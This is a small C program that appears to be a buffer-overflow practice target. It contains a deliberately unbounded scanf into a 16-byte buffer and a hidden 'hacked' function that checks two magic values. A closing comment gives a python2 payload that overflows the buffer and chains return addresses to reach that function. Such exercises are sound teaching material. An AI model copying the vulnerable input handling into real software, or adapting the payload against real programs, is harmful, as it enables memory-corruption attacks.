#include <stdio.h>

void hacked(long first, long second)
{
    if (first == 0xdeadbeefdeadbeef && second == 0xc0debabec0debabe){
        printf("This function is TOP SECRET! How did you get in here?! :O\n");
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");
    }
}

void register_name()
{
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main()
{
    register_name();

    return 0;
}

// python2 - c "print 'A'*24  + '\x4b\x12\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xbe' + '\x49\x12\x40\x00\x00\x00\x00\x00' + '\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + 'AAAAAAAA' + '\x42\x11\x40\x00\x00\x00\x00\x00'"